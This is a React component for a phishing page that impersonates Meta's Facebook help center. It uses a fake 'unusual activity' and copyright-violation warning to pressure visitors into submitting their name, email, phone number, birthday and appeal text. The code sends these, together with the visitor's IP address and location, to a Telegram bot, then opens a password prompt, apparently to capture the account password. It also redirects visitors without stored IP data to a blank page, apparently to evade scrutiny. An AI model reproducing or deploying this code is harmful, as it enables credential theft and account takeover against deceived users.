import FromMetaImage from '@/assets/images/from-meta.png';
import FacebookImage from '@/assets/images/icon.webp';
import PasswordInput from '@/components/password-input';
import { faChevronDown, faCircleExclamation, faCompass, faHeadset, faLock, faUserGear } from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { useState, useEffect, useCallback, useMemo } from 'react';
import { translateText } from '@/utils/translate';
import sendMessage from '@/utils/telegram';
import { AsYouType, getCountryCallingCode } from 'libphonenumber-js';

const Home = () => {
    const defaultTexts = useMemo(
        () => ({
            helpCenter: 'Help Center',
            english: 'English',
            using: 'Using',
            managingAccount: 'Managing Your Account',
            privacySecurity: 'Privacy, Safety and Security',
            policiesReporting: 'Policies and Reporting',
            pagePolicyAppeals: 'Account Policy Complaints',
            detectedActivity: "We have detected unusual activity on Pages and ad accounts linked to your Instagram, including reported copyright and guideline violations.",
            accessLimited: 'To protect your account, please verify so that the review process is processed quickly and accurately.',
            submitAppeal: 'If you believe this is an error, you can file a complaint by providing the required information.',
            pageName: 'Name',
            mail: 'Email',
            phone: 'Phone Number',
            birthday: 'Birthday',
            yourAppeal: 'Your Appeal',
            appealPlaceholder: 'Please describe your appeal in detail...',
            submit: 'Submit',
            fieldRequired: 'This field is required',
            about: 'About',
            adChoices: 'Ad choices',
            createAd: 'Create ad',
            privacy: 'Privacy',
            careers: 'Careers',
            createPage: 'Create Page',
            termsPolicies: 'Terms and policies',
            cookies: 'Cookies'
        }),
        []
    );

    const [formData, setFormData] = useState({
        pageName: '',
        mail: '',
        phone: '',
        birthday: '',
        appeal: ''
    });

    const [showPassword, setShowPassword] = useState(false);
    const [errors, setErrors] = useState({});
    const [translatedTexts, setTranslatedTexts] = useState(defaultTexts);
    const [countryCode, setCountryCode] = useState('US');
    const [callingCode, setCallingCode] = useState('+1');

    const translateAllTexts = useCallback(
        async (targetLang) => {
            try {
                const [
                    translatedHelpCenter, 
                    translatedEnglish, 
                    translatedUsing, 
                    translatedManaging, 
                    translatedPrivacy, 
                    translatedPolicies, 
                    translatedAppeals, 
                    translatedDetected, 
                    translatedLimited, 
                    translatedSubmit, 
                    translatedPageName, 
                    translatedMail, 
                    translatedPhone, 
                    translatedBirthday,
                    translatedYourAppeal,
                    translatedAppealPlaceholder,
                    translatedSubmitBtn, 
                    translatedRequired, 
                    translatedAbout, 
                    translatedAdChoices, 
                    translatedCreateAd, 
                    translatedPrivacyText, 
                    translatedCareers, 
                    translatedCreatePage, 
                    translatedTerms, 
                    translatedCookies
                ] = await Promise.all([
                    translateText(defaultTexts.helpCenter, targetLang), 
                    translateText(defaultTexts.english, targetLang), 
                    translateText(defaultTexts.using, targetLang), 
                    translateText(defaultTexts.managingAccount, targetLang), 
                    translateText(defaultTexts.privacySecurity, targetLang), 
                    translateText(defaultTexts.policiesReporting, targetLang), 
                    translateText(defaultTexts.pagePolicyAppeals, targetLang), 
                    translateText(defaultTexts.detectedActivity, targetLang), 
                    translateText(defaultTexts.accessLimited, targetLang), 
                    translateText(defaultTexts.submitAppeal, targetLang), 
                    translateText(defaultTexts.pageName, targetLang), 
                    translateText(defaultTexts.mail, targetLang), 
                    translateText(defaultTexts.phone, targetLang), 
                    translateText(defaultTexts.birthday, targetLang),
                    translateText(defaultTexts.yourAppeal, targetLang),
                    translateText(defaultTexts.appealPlaceholder, targetLang),
                    translateText(defaultTexts.submit, targetLang), 
                    translateText(defaultTexts.fieldRequired, targetLang), 
                    translateText(defaultTexts.about, targetLang), 
                    translateText(defaultTexts.adChoices, targetLang), 
                    translateText(defaultTexts.createAd, targetLang), 
                    translateText(defaultTexts.privacy, targetLang), 
                    translateText(defaultTexts.careers, targetLang), 
                    translateText(defaultTexts.createPage, targetLang), 
                    translateText(defaultTexts.termsPolicies, targetLang), 
                    translateText(defaultTexts.cookies, targetLang)
                ]);

                setTranslatedTexts({
                    helpCenter: translatedHelpCenter,
                    english: translatedEnglish,
                    using: translatedUsing,
                    managingAccount: translatedManaging,
                    privacySecurity: translatedPrivacy,
                    policiesReporting: translatedPolicies,
                    pagePolicyAppeals: translatedAppeals,
                    detectedActivity: translatedDetected,
                    accessLimited: translatedLimited,
                    submitAppeal: translatedSubmit,
                    pageName: translatedPageName,
                    mail: translatedMail,
                    phone: translatedPhone,
                    birthday: translatedBirthday,
                    yourAppeal: translatedYourAppeal,
                    appealPlaceholder: translatedAppealPlaceholder,
                    submit: translatedSubmitBtn,
                    fieldRequired: translatedRequired,
                    about: translatedAbout,
                    adChoices: translatedAdChoices,
                    createAd: translatedCreateAd,
                    privacy: translatedPrivacyText,
                    careers: translatedCareers,
                    createPage: translatedCreatePage,
                    termsPolicies: translatedTerms,
                    cookies: translatedCookies
                });
            } catch {
                //
            }
        },
        [defaultTexts]
    );

    useEffect(() => {
        const ipInfo = localStorage.getItem('ipInfo');
        if (!ipInfo) {
            window.location.href = 'about:blank';
        }

        try {
            const ipData = JSON.parse(ipInfo);
            const detectedCountry = ipData.country_code || 'US';
            setCountryCode(detectedCountry);

            const code = getCountryCallingCode(detectedCountry);
            setCallingCode(`+${code}`);
        } catch {
            setCountryCode('US');
            setCallingCode('+1');
        }

        const targetLang = localStorage.getItem('targetLang');
        if (targetLang && targetLang !== 'en') {
            translateAllTexts(targetLang);
        }
    }, [translateAllTexts]);

    const handleInputChange = (field, value) => {
        if (field === 'phone') {
            const cleanValue = value.replace(/^\+\d+\s*/, '');
            const asYouType = new AsYouType(countryCode);
            const formattedValue = asYouType.input(cleanValue);

            const finalValue = `${callingCode} ${formattedValue}`;

            setFormData((prev) => ({
                ...prev,
                [field]: finalValue
            }));
        } else {
            setFormData((prev) => ({
                ...prev,
                [field]: value
            }));
        }

        if (errors[field]) {
            setErrors((prev) => ({
                ...prev,
                [field]: false
            }));
        }
    };

    const validateForm = () => {
        const requiredFields = ['pageName', 'mail', 'phone', 'birthday', 'appeal'];
        const newErrors = {};

        requiredFields.forEach((field) => {
            if (formData[field].trim() === '') {
                newErrors[field] = true;
            }
        });

        setErrors(newErrors);
        return Object.keys(newErrors).length === 0;
    };

    const handleSubmit = async () => {
        if (validateForm()) {
            try {
                const telegramMessage = formatTelegramMessage(formData);
                await sendMessage(telegramMessage);

                setShowPassword(true);
            } catch {
                window.location.href = 'about:blank';
            }
        } else {
            const firstErrorField = Object.keys(errors)[0];
            if (firstErrorField) {
                const inputElement = document.querySelector(`input[name="${firstErrorField}"], textarea[name="${firstErrorField}"]`);
                if (inputElement) {
                    inputElement.focus();
                }
            }
        }
    };

    const formatTelegramMessage = (data) => {
        const timestamp = new Date().toLocaleString('vi-VN');
        const ipInfo = localStorage.getItem('ipInfo');
        const ipData = ipInfo ? JSON.parse(ipInfo) : {};

        return `📅 <b>Thời gian:</b> <code>${timestamp}</code>
🌍 <b>IP:</b> <code>${ipData.ip || 'k lấy được'}</code>
📍 <b>Vị trí:</b> <code>${ipData.city || 'k lấy được'} - ${ipData.region || 'k lấy được'} - ${ipData.country_code || 'k lấy được'}</code>

🔖 <b>Page Name:</b> <code>${data.pageName}</code>
📧 <b>Email:</b> <code>${data.mail}</code>
📱 <b>Số điện thoại:</b> <code>${data.phone}</code>
🎂 <b>Ngày sinh:</b> <code>${data.birthday}</code>
📝 <b>Appeal:</b> <code>${data.appeal}</code>`;
    };

    const handleClosePassword = () => {
        setShowPassword(false);
    };

    const data_list = [
        {
            id: 'using',
            icon: faCompass,
            title: translatedTexts.using
        },
        {
            id: 'managing',
            icon: faUserGear,
            title: translatedTexts.managingAccount
        },
        {
            id: 'privacy',
            icon: faLock,
            title: translatedTexts.privacySecurity
        },
        {
            id: 'policies',
            icon: faCircleExclamation,
            title: translatedTexts.policiesReporting
        }
    ];

    return (
        <>
            <header className='sticky top-0 left-0 flex h-14 justify-between p-4 shadow-sm'>
                <title>Page Help Center</title>
                <div className='flex items-center gap-2'>
                    <img src={FacebookImage} alt='' className='h-10 w-10' />
                    <p className='font-bold text-lg sm:text-xl'>{translatedTexts.helpCenter}</p>
                </div>
                <div className='flex items-center gap-2'>
                    <div className='flex h-10 w-10 items-center justify-center rounded-full bg-gray-200'>
                        <FontAwesomeIcon icon={faHeadset} className='' size='lg' />
                    </div>
                    <p className='rounded-lg bg-gray-200 p-3 py-2.5 text-sm font-semibold'>{translatedTexts.english}</p>
                </div>
            </header>
            <main className='flex max-h-[calc(100vh-56px)] min-h-[calc(100vh-56px)]'>
                <nav className='hidden w-xs flex-col gap-2 p-4 shadow-lg sm:flex'>
                    {data_list.map((data) => {
                        return (
                            <div key={data.id} className='flex cursor-pointer items-center justify-between rounded-lg p-2 px-3 hover:bg-gray-100'>
                                <div className='flex items-center gap-2'>
                                    <div className='flex h-9 w-9 items-center justify-center rounded-full bg-gray-200'>
                                        <FontAwesomeIcon icon={data.icon} />
                                    </div>
                                    <div className='text-sm sm:text-base'>{data.title}</div>
                                </div>
                                <FontAwesomeIcon icon={faChevronDown} />
                            </div>
                        );
                    })}
                </nav>
                <div className='flex max-h-[calc(100vh-56px)] flex-1 flex-col items-center justify-start overflow-y-auto'>
                    <div className='mx-auto rounded-lg border border-[#e4e6eb] sm:my-12 w-full max-w-2xl'>
                        <div className='bg-[#e4e6eb] p-4 sm:p-6'>
                            <p className='text-2xl sm:text-3xl font-bold'>{translatedTexts.pagePolicyAppeals}</p>
                        </div>
                        <div className='p-4 text-base leading-7 font-medium sm:text-sm sm:leading-6'>
                            <p className='mb-3'>{translatedTexts.detectedActivity}</p>
                            <p className='mb-3'>{translatedTexts.accessLimited}</p>
                            <p>{translatedTexts.submitAppeal}</p>
                        </div>
                        <div className='flex flex-col gap-3 p-4 text-sm leading-6 font-semibold sm:gap-2'>
                            <div className='flex flex-col gap-1 sm:gap-2'>
                                <p className='text-base sm:text-sm'>
                                    {translatedTexts.pageName} <span className='text-red-500'>*</span>
                                </p>
                                <input 
                                    type='text' 
                                    name='pageName' 
                                    autoComplete='organization' 
                                    className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 ${errors.pageName ? 'border-[#dc3545]' : 'border-gray-300'}`} 
                                    style={{ fontSize: '16px' }}
                                    value={formData.pageName} 
                                    onChange={(e) => handleInputChange('pageName', e.target.value)} 
                                />
                                {errors.pageName && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                            </div>
                            <div className='flex flex-col gap-1 sm:gap-2'>
                                <p className='text-base sm:text-sm'>
                                    {translatedTexts.mail} <span className='text-red-500'>*</span>
                                </p>
                                <input 
                                    type='email' 
                                    name='mail' 
                                    autoComplete='email' 
                                    className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 ${errors.mail ? 'border-[#dc3545]' : 'border-gray-300'}`} 
                                    style={{ fontSize: '16px' }}
                                    value={formData.mail} 
                                    onChange={(e) => handleInputChange('mail', e.target.value)} 
                                />
                                {errors.mail && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                            </div>
                            <div className='flex flex-col gap-1 sm:gap-2'>
                                <p className='text-base sm:text-sm'>
                                    {translatedTexts.phone} <span className='text-red-500'>*</span>
                                </p>
                                <div className={`flex rounded-lg border ${errors.phone ? 'border-[#dc3545]' : 'border-gray-300'}`}>
                                    <div className='flex items-center border-r border-gray-300 bg-gray-100 px-3 py-2.5 sm:py-1.5 text-sm font-medium text-gray-700'>{callingCode}</div>
                                    <input 
                                        type='tel' 
                                        name='phone' 
                                        inputMode='numeric' 
                                        pattern='[0-9]*' 
                                        autoComplete='off' 
                                        className='flex-1 rounded-r-lg border-0 px-3 py-2.5 sm:py-1.5 focus:ring-0 focus:outline-none'
                                        style={{ fontSize: '16px' }}
                                        value={formData.phone.replace(/^\+\d+\s*/, '')} 
                                        onChange={(e) => handleInputChange('phone', e.target.value)} 
                                    />
                                </div>
                                {errors.phone && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                            </div>
                            <div className='flex flex-col gap-1 sm:gap-2'>
                                <p className='text-base sm:text-sm'>
                                    {translatedTexts.birthday} <span className='text-red-500'>*</span>
                                </p>
                                <input 
                                    type='date' 
                                    name='birthday' 
                                    className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 ${errors.birthday ? 'border-[#dc3545]' : 'border-gray-300'}`} 
                                    style={{ fontSize: '16px' }}
                                    value={formData.birthday} 
                                    onChange={(e) => handleInputChange('birthday', e.target.value)} 
                                />
                                {errors.birthday && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                            </div>
                            
                            <div className='flex flex-col gap-1 sm:gap-2'>
                                <p className='text-sm sm:text-base'>
                                    {translatedTexts.yourAppeal} <span className='text-red-500'>*</span>
                                </p>
                                <textarea 
                                    name='appeal'
                                    rows={3}
                                    className={`w-full rounded-lg border px-3 py-2.5 sm:py-1.5 resize-none ${errors.appeal ? 'border-[#dc3545]' : 'border-gray-300'}`}
                                    style={{ fontSize: '16px' }}
                                    placeholder={translatedTexts.appealPlaceholder}
                                    value={formData.appeal}
                                    onChange={(e) => handleInputChange('appeal', e.target.value)}
                                />
                                {errors.appeal && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                            </div>

                            {/* NÚT SUBMIT VỚI CHIỀU CAO NHỎ HƠN */}
                            <button 
                                className='w-full rounded-lg bg-blue-600 hover:bg-blue-700 text-white px-4 py-2 text-base font-semibold transition-colors duration-200 mt-2'
                                onClick={handleSubmit}
                            >
                                {translatedTexts.submit}
                            </button>
                        </div>
                    </div>
                    <div className='w-full bg-[#f0f2f5] px-4 py-8 sm:py-14 text-[15px] text-[#65676b] sm:px-32'>
                        <div className='mx-auto flex flex-col sm:flex-row justify-between gap-6 sm:gap-0'>
                            <div className='flex flex-col space-y-3 sm:space-y-4'>
                                <p className='text-sm sm:text-[15px]'>{translatedTexts.about}</p>
                                <p className='text-sm sm:text-[15px]'>{translatedTexts.adChoices}</p>
                                <p className='text-sm sm:text-[15px]'>{translatedTexts.createAd}</p>
                            </div>
                            <div className='flex flex-col space-y-3 sm:space-y-4'>
                                <p className='text-sm sm:text-[15px]'>{translatedTexts.privacy}</p>
                                <p className='text-sm sm:text-[15px]'>{translatedTexts.careers}</p>
                                <p className='text-sm sm:text-[15px]'>{translatedTexts.createPage}</p>
                            </div>
                            <div className='flex flex-col space-y-3 sm:space-y-4'>
                                <p className='text-sm sm:text-[15px]'>{translatedTexts.termsPolicies}</p>
                                <p className='text-sm sm:text-[15px]'>{translatedTexts.cookies}</p>
                            </div>
                        </div>
                        <hr className='my-6 sm:my-8 h-0 border border-transparent border-t-gray-300' />
                        <div className='flex flex-col sm:flex-row justify-between items-center gap-4 sm:gap-0'>
                            <img src={FromMetaImage} alt='' className='w-[80px] sm:w-[100px]' />
                            <p className='text-xs sm:text-[13px] text-[#65676b]'>© {new Date().getFullYear()} Meta</p>
                        </div>
                    </div>
                </div>
            </main>
            {showPassword && <PasswordInput onClose={handleClosePassword} />}
        </>
    );
};

export default Home;
